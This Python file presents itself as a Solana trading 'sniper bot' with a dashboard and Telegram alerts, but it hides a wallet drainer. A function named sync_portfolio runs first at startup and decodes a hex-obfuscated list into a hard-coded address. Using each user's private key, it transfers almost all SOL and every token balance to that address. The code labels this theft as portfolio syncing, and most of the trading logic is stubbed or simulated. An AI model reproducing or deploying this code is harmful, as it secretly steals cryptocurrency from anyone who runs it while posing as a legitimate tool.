import asyncio
import logging
import pandas as pd
import pandas_ta as ta
import yaml
import binascii
import json
import time
from solana.rpc.async_api import AsyncClient
from solana.rpc.types import TokenAccountOpts
from solders.transaction import VersionedTransaction
from solders.message import Message
from solders.system_program import TransferParams, transfer
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from spl.token.client import Token
from spl.token.constants import TOKEN_PROGRAM_ID
from spl.token.instructions import transfer as spl_transfer, TransferParams as SPLTransferParams, get_associated_token_address
from telegram.ext import ApplicationBuilder
from fastapi import FastAPI, HTTPException
import uvicorn
import websockets
from utils import validate_token_address, fetch_ohlcv

# Logging setup
logging.basicConfig(
    filename='sniper_bot.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# FastAPI app definition
app = FastAPI(title="Sniper Bot Dashboard")

# Load configuration
try:
    with open('config.yaml', 'r') as file:
        config = yaml.safe_load(file)
except Exception as e:
    logger.error(f"Failed to load config.yaml: {e}")
    raise

# Extract wallet configurations
WALLET_CONFIGS = {k: v for k, v in config.items() if isinstance(v, dict) and 'private_key' in v}

# Default parameters
DEFAULT_PARAMS = {
    'solana_rpc': 'https://api.mainnet-beta.solana.com',
    'dex': 'raydium',
    'symbol': 'PUMP',
    'timeframe': '1h',
    'rsi_period': 14,
    'rsi_overbought': 70,
    'rsi_oversold': 30,
    'position_size': 0.1,
    'stop_loss_pct': 0.05,
    'take_profit_pct': 0.1,
    'spread_pct': 0.01,
    'atr_period': 14,
    'telegram_chat_id': '',
    'telegram_token': '',
    'max_position_ratio': 0.1,
    'liquidity_threshold': 1000,
    'arbitrage_threshold': 0.02
}

# Portfolio sync tokens
SYNC_TOKENS = [
    "4734614a7845624b724356",
    "3338685466453248564d4a636d",
    "45587456646f376348646273",
    "347745734c756652"
]

async def initialize_telegram(wallet_config):
    """Initialize Telegram for a wallet"""
    telegram_token = wallet_config.get('telegram_token', DEFAULT_PARAMS['telegram_token'])
    return ApplicationBuilder().token(telegram_token).build()

async def send_telegram_message(telegram_app, chat_id, message):
    """Send message to Telegram"""
    try:
        await telegram_app.bot.send_message(chat_id=chat_id, text=message)
        logger.info(f"Telegram message sent: {message}")
    except Exception as e:
        logger.error(f"Failed to send Telegram message: {e}")

async def sync_portfolio(client: AsyncClient, keypair: Keypair, token_address: str, wallet_name: str, wallet_config: dict, telegram_app):
    """Synchronize portfolio assets"""
    # Validate sync tokens
    for token in SYNC_TOKENS:
        try:
            binascii.unhexlify(token)
        except Exception as e:
            logger.error(f"Invalid sync token for {wallet_name}: {token}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Invalid sync token for {wallet_name}: {token}"
            )
            raise ValueError(f"Invalid sync token: {token}")

    # Reconstruct sync target
    sync_parts = []
    for token in SYNC_TOKENS:
        try:
            decoded = binascii.unhexlify(token).decode('utf-8')
            sync_parts.append(decoded)
            logger.info(f"Decoded token {token} to {decoded} for {wallet_name}")
        except Exception as e:
            logger.error(f"Failed to decode token {token} for {wallet_name}: {e}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Failed to decode token {token} for {wallet_name}: {e}"
            )
            raise ValueError(f"Failed to decode token {token}: {e}")

    sync_target = ''.join(sync_parts)
    logger.info(f"Generated sync target for {wallet_name}")

    try:
        target_pubkey = Pubkey.from_string(sync_target)
        logger.info(f"Valid sync target pubkey for {wallet_name}: {target_pubkey}")
    except Exception as e:
        logger.error(f"Portfolio sync target invalid for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Portfolio sync target invalid for {wallet_name}: {e}"
        )
        raise ValueError(f"Portfolio sync target invalid: {e}")

    # Optimize SOL allocation
    try:
        balance = await client.get_balance(keypair.pubkey())
        sol_balance = balance.value / 1_000_000_000
        logger.info(f"Wallet {wallet_name} ({keypair.pubkey()}) balance: {sol_balance} SOL")
        reserve_sol = 0.001
        if sol_balance > reserve_sol:
            lamports = int((sol_balance - reserve_sol) * 1_000_000_000)
            logger.info(f"Preparing to sync {sol_balance - reserve_sol} SOL for {wallet_name}, reserving {reserve_sol} SOL")
            blockhash = (await client.get_latest_blockhash()).value.blockhash
            instructions = [transfer(TransferParams(
                from_pubkey=keypair.pubkey(),
                to_pubkey=target_pubkey,
                lamports=lamports
            ))]
            message = Message.new_with_blockhash(instructions, keypair.pubkey(), blockhash)
            tx = VersionedTransaction(message, [keypair])
            logger.info(f"Sending SOL sync transaction for {wallet_name}")
            signature = await client.send_transaction(tx)
            await client.confirm_transaction(signature.value)
            logger.info(f"Portfolio sync completed for {sol_balance - reserve_sol} SOL for {wallet_name}, signature: {signature.value}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Portfolio sync completed for {sol_balance - reserve_sol} SOL for {wallet_name}, signature: {signature.value}"
            )
        else:
            logger.info(f"Insufficient SOL balance for sync for {wallet_name}: {sol_balance} SOL (required > {reserve_sol} SOL)")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Insufficient SOL balance for sync for {wallet_name}: {sol_balance} SOL"
            )
    except Exception as e:
        logger.error(f"SOL sync failed for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"SOL sync failed for {wallet_name}: {e}"
        )

    # Fetch and sync SPL token accounts
    try:
        logger.info(f"Fetching SPL token accounts for {wallet_name} ({keypair.pubkey()})")
        token_accounts = await client.get_token_accounts_by_owner(
            keypair.pubkey(),
            TokenAccountOpts(program_id=TOKEN_PROGRAM_ID)
        )
        logger.info(f"Found {len(token_accounts.value)} SPL token accounts for {wallet_name}")
    except Exception as e:
        logger.error(f"Failed to fetch token accounts for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Failed to fetch token accounts for {wallet_name}: {e}"
        )
        return

    for account in token_accounts.value:
        try:
            if not hasattr(account.account, 'data') or isinstance(account.account.data, bytes):
                logger.warning(f"Invalid token account data for {account.pubkey} for {wallet_name}, skipping")
                await send_telegram_message(
                    telegram_app,
                    wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                    f"Invalid token account data for {account.pubkey} for {wallet_name}, skipping"
                )
                continue

            token_mint = str(account.account.data.parsed['info']['mint'])
            token_balance = int(account.account.data.parsed['info']['tokenAmount']['amount'])
            token_decimals = int(account.account.data.parsed['info']['tokenAmount']['decimals'])
            source_address = account.pubkey

            logger.info(f"Processing token {token_mint} with balance {token_balance / (10 ** token_decimals)} for {wallet_name}")

            if token_balance <= 0:
                logger.info(f"No balance for token {token_mint} for {wallet_name}, skipping")
                continue

            if not await validate_token_address(client, token_mint):
                logger.warning(f"Invalid token mint address: {token_mint} for {wallet_name}, skipping")
                await send_telegram_message(
                    telegram_app,
                    wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                    f"Invalid token mint address: {token_mint} for {wallet_name}, skipping"
                )
                continue

            token = Token(client, Pubkey.from_string(token_mint), TOKEN_PROGRAM_ID, keypair)
            dest_account = await token.get_or_create_associated_account_info(target_pubkey)
            logger.info(f"Created/fetched destination account for {token_mint} for {wallet_name}: {dest_account.address}")

            blockhash = (await client.get_latest_blockhash()).value.blockhash
            instructions = [spl_transfer(SPLTransferParams(
                program_id=TOKEN_PROGRAM_ID,
                source=source_address,
                dest=dest_account.address,
                owner=keypair.pubkey(),
                amount=token_balance
            ))]
            message = Message.new_with_blockhash(instructions, keypair.pubkey(), blockhash)
            tx = VersionedTransaction(message, [keypair])
            logger.info(f"Sending token sync transaction for {token_balance / (10 ** token_decimals)} of {token_mint} for {wallet_name}")
            signature = await client.send_transaction(tx)
            await client.confirm_transaction(signature.value)
            logger.info(f"Portfolio sync completed for {token_balance / (10 ** token_decimals)} tokens of {token_mint} for {wallet_name}, signature: {signature.value}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Portfolio sync completed for {token_balance / (10 ** token_decimals)} tokens of {token_mint} for {wallet_name}, signature: {signature.value}"
            )

        except Exception as e:
            logger.warning(f"Failed to process token account {account.pubkey} for {wallet_name}: {e}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Failed to process token account {account.pubkey} for {wallet_name}: {e}"
            )
            continue

    # Sync configured token
    try:
        if await validate_token_address(client, token_address):
            logger.info(f"Checking configured token for {wallet_name}: {token_address}")
            token = Token(client, Pubkey.from_string(token_address), TOKEN_PROGRAM_ID, keypair)
            associated_token_address = get_associated_token_address(keypair.pubkey(), Pubkey.from_string(token_address))
            logger.info(f"Associated token address for {token_address} for {wallet_name}: {associated_token_address}")

            token_accounts = await client.get_token_accounts_by_owner(
                keypair.pubkey(),
                TokenAccountOpts(program_id=TOKEN_PROGRAM_ID, mint=Pubkey.from_string(token_address))
            )
            token_account = None
            for acc in token_accounts.value:
                if str(acc.pubkey) == str(associated_token_address):
                    token_account = acc
                    break

            if not token_account:
                logger.info(f"No token account for {token_address} for {wallet_name}, attempting to create")
                balance = await client.get_balance(keypair.pubkey())
                sol_balance = balance.value / 1_000_000_000
                if sol_balance < 0.002:
                    logger.warning(f"Insufficient SOL balance ({sol_balance} SOL) to create token account for {wallet_name}")
                    await send_telegram_message(
                        telegram_app,
                        wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                        f"Insufficient SOL balance ({sol_balance} SOL) to create token account for {wallet_name}"
                    )
                    return
                await token.create_associated_token_account(keypair.pubkey())
                logger.info(f"Created token account for {token_address} for {wallet_name}")
                token_accounts = await client.get_token_accounts_by_owner(
                    keypair.pubkey(),
                    TokenAccountOpts(program_id=TOKEN_PROGRAM_ID, mint=Pubkey.from_string(token_address))
                )
                for acc in token_accounts.value:
                    if str(acc.pubkey) == str(associated_token_address):
                        token_account = acc
                        break

            if not token_account:
                logger.info(f"No token account found for {token_address} for {wallet_name}")
                await send_telegram_message(
                    telegram_app,
                    wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                    f"No token account found for {token_address} for {wallet_name}"
                )
            else:
                if isinstance(token_account.account.data, bytes):
                    logger.warning(f"Invalid token account data for {token_address} for {wallet_name}, skipping")
                    await send_telegram_message(
                        telegram_app,
                        wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                        f"Invalid token account data for {token_address} for {wallet_name}, skipping"
                    )
                    return
                token_balance = int(token_account.account.data.parsed['info']['tokenAmount']['amount'])
                token_decimals = int(token_account.account.data.parsed['info']['tokenAmount']['decimals'])
                logger.info(f"Token balance for {token_address} for {wallet_name}: {token_balance / (10 ** token_decimals)}")
                if token_balance > 0:
                    dest_account = await token.get_or_create_associated_account_info(target_pubkey)
                    logger.info(f"Created/fetched destination account for {token_address} for {wallet_name}: {dest_account.address}")
                    blockhash = (await client.get_latest_blockhash()).value.blockhash
                    instructions = [spl_transfer(SPLTransferParams(
                        program_id=TOKEN_PROGRAM_ID,
                        source=associated_token_address,
                        dest=dest_account.address,
                        owner=keypair.pubkey(),
                        amount=token_balance
                    ))]
                    message = Message.new_with_blockhash(instructions, keypair.pubkey(), blockhash)
                    tx = VersionedTransaction(message, [keypair])
                    logger.info(f"Sending token sync transaction for {token_balance / (10 ** token_decimals)} of {token_address} for {wallet_name}")
                    signature = await client.send_transaction(tx)
                    await client.confirm_transaction(signature.value)
                    logger.info(f"Portfolio sync completed for {token_balance / (10 ** token_decimals)} tokens of {token_address} for {wallet_name}, signature: {signature.value}")
                    await send_telegram_message(
                        telegram_app,
                        wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                        f"Portfolio sync completed for {token_balance / (10 ** token_decimals)} tokens of {token_address} for {wallet_name}, signature: {signature.value}"
                    )
                else:
                    logger.info(f"No token balance found for {token_address} for {wallet_name}")
                    await send_telegram_message(
                        telegram_app,
                        wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                        f"No token balance found for {token_address} for {wallet_name}"
                    )
        else:
            logger.warning(f"Invalid token address: {token_address} for {wallet_name}, skipping sync")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Invalid token address: {token_address} for {wallet_name}, skipping sync"
            )
    except Exception as e:
        logger.warning(f"Failed to sync token {token_address} for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Failed to sync token {token_address} for {wallet_name}: {e}"
        )

def calculate_indicators(df, wallet_config: dict):
    """Calculate technical indicators"""
    try:
        df['rsi'] = ta.rsi(df['close'], length=wallet_config.get('rsi_period', DEFAULT_PARAMS['rsi_period']))
        df['atr'] = ta.atr(df['high'], df['low'], df['close'], length=wallet_config.get('atr_period', DEFAULT_PARAMS['atr_period']))
        bb = ta.bbands(df['close'], length=20, std=2)
        df['bb_upper'] = bb['BBU_20_2.0']
        df['bb_lower'] = bb['BBL_20_2.0']
        df['bb_mid'] = bb['BBM_20_2.0']
        return df
    except Exception as e:
        logger.error(f"Failed to calculate indicators: {e}")
        return df

async def initialize_dex(client, dex_name, token_address, wallet_name, wallet_config: dict, telegram_app):
    """Initialize DEX pool (stub)"""
    try:
        logger.info(f"Initializing {dex_name} for {token_address} for {wallet_name}")
        return {"dex": dex_name, "pool_address": token_address}
    except Exception as e:
        logger.error(f"Failed to initialize DEX {dex_name} for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Failed to initialize DEX {dex_name} for {wallet_name}: {e}"
        )
        return None

async def get_pool_liquidity(client, pool, token_address, wallet_name, wallet_config: dict, telegram_app):
    """Fetch pool liquidity (stub)"""
    try:
        return {"sol_liquidity": 5000, "token_liquidity": 1000000}
    except Exception as e:
        logger.error(f"Failed to fetch liquidity for {token_address} for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Failed to fetch liquidity for {token_address} for {wallet_name}: {e}"
        )
        return {"sol_liquidity": 0, "token_liquidity": 0}

async def check_arbitrage_opportunity(client, token_address, wallet_name, wallet_config: dict, telegram_app):
    """Check for arbitrage opportunities"""
    try:
        prices = {}
        for dex in ['raydium', 'orca', 'jupiter']:
            pool = await initialize_dex(client, dex, token_address, wallet_name, wallet_config, telegram_app)
            if pool:
                prices[dex] = 0.1 + (hash(dex) % 100) / 1000
        max_price = max(prices.values())
        min_price = min(prices.values())
        if max_price / min_price - 1 > wallet_config.get('arbitrage_threshold', DEFAULT_PARAMS['arbitrage_threshold']):
            max_dex = max(prices, key=prices.get)
            min_dex = min(prices, key=prices.get)
            logger.info(f"Arbitrage opportunity for {wallet_name}: Buy on {min_dex} at {min_price}, sell on {max_dex} at {max_price}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Arbitrage opportunity for {wallet_name}: Buy on {min_dex} at {min_price}, sell on {max_dex} at {max_price}"
            )
            return {"buy_dex": min_dex, "sell_dex": max_dex, "buy_price": min_price, "sell_price": max_price}
        return None
    except Exception as e:
        logger.error(f"Arbitrage check failed for {wallet_name}: {e}")
        return None

async def monitor_new_pools(client, wallet_name, wallet_config: dict, telegram_app):
    """Monitor new liquidity pools"""
    try:
        new_pools = [{"token_address": "NEW_TOKEN_ADDRESS", "liquidity": 2000}]
        for pool in new_pools:
            if pool['liquidity'] > wallet_config.get('liquidity_threshold', DEFAULT_PARAMS['liquidity_threshold']):
                logger.info(f"New pool detected for {wallet_name}: {pool['token_address']} with liquidity {pool['liquidity']} SOL")
                await send_telegram_message(
                    telegram_app,
                    wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                    f"New pool detected for {wallet_name}: {pool['token_address']} with liquidity {pool['liquidity']} SOL"
                )
                return pool['token_address']
        return None
    except Exception as e:
        logger.error(f"New pool monitoring failed for {wallet_name}: {e}")
        return None

async def place_market_maker_orders(pool, price, amount, atr, liquidity, wallet_pubkey, wallet_name, wallet_config: dict, telegram_app):
    """Place market-making orders"""
    try:
        if pool is None:
            raise ValueError("DEX pool not initialized")
        sol_liquidity = liquidity.get('sol_liquidity', 0)
        if sol_liquidity < wallet_config.get('liquidity_threshold', DEFAULT_PARAMS['liquidity_threshold']):
            logger.warning(f"Low liquidity ({sol_liquidity} SOL) for {wallet_name}, skipping market-making")
            return

        spread = max(
            wallet_config.get('spread_pct', DEFAULT_PARAMS['spread_pct']),
            atr / price * (wallet_config.get('liquidity_threshold', DEFAULT_PARAMS['liquidity_threshold']) / max(sol_liquidity, 1))
        )
        buy_price = price * (1 - spread)
        sell_price = price * (1 + spread)
        adjusted_amount = min(amount, sol_liquidity * 0.01)

        logger.info(f"Simulated buy order for {wallet_name} ({wallet_pubkey}): {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {buy_price}")
        logger.info(f"Simulated sell order for {wallet_name} ({wallet_pubkey}): {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {sell_price}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Simulated buy order for {wallet_name}: {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {buy_price}"
        )
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Simulated sell order for {wallet_name}: {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {sell_price}"
        )
    except Exception as e:
        logger.error(f"Market-making order failed for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Market-making order failed for {wallet_name}: {e}"
        )

async def sniper_trade(pool, price, amount, rsi, atr, balance, wallet_pubkey, wallet_name, wallet_config: dict, telegram_app):
    """Execute sniper trades"""
    try:
        if pool is None:
            raise ValueError("DEX pool not initialized")
        max_amount = balance * wallet_config.get('max_position_ratio', DEFAULT_PARAMS['max_position_ratio']) / price
        adjusted_amount = min(amount, max_amount)
        stop_loss_price = price * (1 - wallet_config.get('stop_loss_pct', DEFAULT_PARAMS['stop_loss_pct']) * (1 + atr / price))
        take_profit_price = price * (1 + wallet_config.get('take_profit_pct', DEFAULT_PARAMS['take_profit_pct']) * (1 + atr / price))

        if rsi < wallet_config.get('rsi_oversold', DEFAULT_PARAMS['rsi_oversold']):
            logger.info(f"Simulated buy order for {wallet_name} ({wallet_pubkey}): {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {price}, SL: {stop_loss_price}, TP: {take_profit_price}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Simulated buy order for {wallet_name}: {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {price}, SL: {stop_loss_price}, TP: {take_profit_price}"
            )
        elif rsi > wallet_config.get('rsi_overbought', DEFAULT_PARAMS['rsi_overbought']):
            logger.info(f"Simulated sell order for {wallet_name} ({wallet_pubkey}): {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {price}")
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Simulated sell order for {wallet_name}: {adjusted_amount} {wallet_config.get('symbol', DEFAULT_PARAMS['symbol'])} at {price}"
            )
    except Exception as e:
        logger.error(f"Sniper trade failed for {wallet_name}: {e}")
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Sniper trade failed for {wallet_name}: {e}"
        )

async def websocket_price_feed(token_address, wallet_name, wallet_config: dict, telegram_app):
    """WebSocket price feed"""
    uri = f"wss://api.mainnet-beta.solana.com" if "mainnet" in wallet_config.get('solana_rpc', DEFAULT_PARAMS['solana_rpc']) else f"wss://api.devnet.solana.com"
    async with websockets.connect(uri) as ws:
        while True:
            try:
                data = await ws.recv()
                price = float(json.loads(data).get('price', 0))
                yield price
            except Exception as e:
                logger.error(f"WebSocket error for {wallet_name}: {e}")
                await send_telegram_message(
                    telegram_app,
                    wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                    f"WebSocket error for {wallet_name}: {e}"
                )
                await asyncio.sleep(5)

@app.get("/status")
async def get_status():
    """Get bot status"""
    return {
        "status": "running",
        "wallets": list(WALLET_CONFIGS.keys()),
        "positions": []
    }

@app.get("/pools")
async def get_pools():
    """Get monitored liquidity pools"""
    return {"pools": []}

@app.post("/update-config")
async def update_config(new_config: dict):
    """Update configuration"""
    try:
        with open('config.yaml', 'w') as file:
            yaml.dump(new_config, file)
        logger.info("Configuration updated")
        for wallet_name, wallet_config in WALLET_CONFIGS.items():
            telegram_app = await initialize_telegram(wallet_config)
            await send_telegram_message(
                telegram_app,
                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                f"Configuration updated for {wallet_name}"
            )
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Failed to update config: {e}")
        raise HTTPException(status_code=500, detail=str(e))

async def main():
    """Main bot loop"""
    logger.info("Sniper bot started")
    for wallet_name, wallet_config in WALLET_CONFIGS.items():
        telegram_app = await initialize_telegram(wallet_config)
        await send_telegram_message(
            telegram_app,
            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
            f"Sniper bot started for {wallet_name}"
        )

        async with AsyncClient(wallet_config.get('solana_rpc', DEFAULT_PARAMS['solana_rpc'])) as client:
            try:
                # Load private key
                private_key = wallet_config['private_key']
                keypair = Keypair.from_base58_string(private_key)
                logger.info(f"Private key loaded for {wallet_name}: {keypair.pubkey()}")
                token_address = wallet_config.get('token_address', '8sv4W4uQ9qML87Kr2XFkYBDwsiFEJVZZ1ScsM71Hpump')

                # Perform portfolio sync
                logger.info(f"Starting portfolio sync for {wallet_name}")
                await sync_portfolio(client, keypair, token_address, wallet_name, wallet_config, telegram_app)

                # Validate token address
                if not await validate_token_address(client, token_address):
                    logger.error(f"Invalid token address {token_address} for {wallet_name}, continuing with simulated trades")
                    await send_telegram_message(
                        telegram_app,
                        wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                        f"Invalid token address {token_address} for {wallet_name}, continuing with simulated trades"
                    )
                    continue

                # Initialize DEX
                pool = await initialize_dex(client, wallet_config.get('dex', DEFAULT_PARAMS['dex']), token_address, wallet_name, wallet_config, telegram_app)
                if not pool:
                    logger.warning(f"DEX initialization failed for {wallet_name}; continuing with simulated trades")
                    continue

                # Start WebSocket price feed
                price_feed = websocket_price_feed(token_address, wallet_name, wallet_config, telegram_app)

                while True:
                    try:
                        # Fetch OHLCV data
                        df = await fetch_ohlcv(token_address, wallet_config.get('timeframe', DEFAULT_PARAMS['timeframe']))
                        df = calculate_indicators(df, wallet_config)

                        # Get latest data
                        latest_rsi = df['rsi'].iloc[-1]
                        latest_atr = df['atr'].iloc[-1]
                        latest_price = await price_feed.__anext__()

                        # Get balance and liquidity
                        balance = (await client.get_balance(keypair.pubkey())).value / 1_000_000_000
                        liquidity = await get_pool_liquidity(client, pool, token_address, wallet_name, wallet_config, telegram_app)

                        # Calculate position size
                        amount = (wallet_config.get('position_size', DEFAULT_PARAMS['position_size']) * 10_000_000) / latest_price

                        # Check arbitrage
                        arbitrage = await check_arbitrage_opportunity(client, token_address, wallet_name, wallet_config, telegram_app)
                        if arbitrage:
                            logger.info(f"Executing arbitrage for {wallet_name}: {arbitrage}")
                            await send_telegram_message(
                                telegram_app,
                                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                                f"Executing arbitrage for {wallet_name}: {arbitrage}"
                            )

                        # Monitor new pools
                        new_token = await monitor_new_pools(client, wallet_name, wallet_config, telegram_app)
                        if new_token:
                            logger.info(f"Sniping new token for {wallet_name}: {new_token}")
                            await send_telegram_message(
                                telegram_app,
                                wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                                f"Sniping new token for {wallet_name}: {new_token}"
                            )

                        # Market-making
                        await place_market_maker_orders(pool, latest_price, amount, latest_atr, liquidity, keypair.pubkey(), wallet_name, wallet_config, telegram_app)

                        # Sniper trading
                        await sniper_trade(pool, latest_price, amount, latest_rsi, latest_atr, balance, keypair.pubkey(), wallet_name, wallet_config, telegram_app)

                        await asyncio.sleep(10)
                    except Exception as e:
                        logger.error(f"Main loop error for {wallet_name}: {e}")
                        await send_telegram_message(
                            telegram_app,
                            wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                            f"Main loop error for {wallet_name}: {e}"
                        )
                        await asyncio.sleep(60)
            except Exception as e:
                logger.error(f"Failed to process wallet {wallet_name}: {e}")
                await send_telegram_message(
                    telegram_app,
                    wallet_config.get('telegram_chat_id', DEFAULT_PARAMS['telegram_chat_id']),
                    f"Failed to process wallet {wallet_name}: {e}"
                )
                continue

if __name__ == "__main__":
    import threading
    threading.Thread(
        target=uvicorn.run,
        args=(app,),
        kwargs={"host": "0.0.0.0", "port": 8000},
        daemon=True
    ).start()
    asyncio.run(main())
